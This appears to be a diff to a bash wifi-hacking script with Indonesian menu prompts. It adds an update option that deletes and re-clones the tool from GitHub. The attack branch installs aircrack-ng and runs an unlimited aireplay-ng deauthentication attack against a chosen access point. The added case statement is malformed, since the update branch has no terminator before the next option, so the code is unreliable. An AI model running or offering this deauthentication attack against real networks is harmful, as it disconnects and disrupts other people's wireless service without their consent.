@@ -1,4 +1,22 @@
 #!/bin/bash
+clear
+read -p "[lanjutkan hacking] [update]" pil;
+case $pil in
+
+
+
+update)
+  echo "[[update]]*"
+  cd 
+  rm -r arcwifi
+  git clone https://github.com/afri64/arcwifi
+  echo "arcwifi selesai di update"
+
+
+
+
+lanjutkan hacking)
+
 mkdir hacked_wifi
 clear
 sudo apt-get install aircrack-ng 
@@ -30,3 +48,7 @@ echo "
 [ARC dev soft]" > last_hacking_data.txt
 
 sudo aireplay-ng -0 0 -a $trgtbssid $adapterwifi
+
+;;
+
+esac
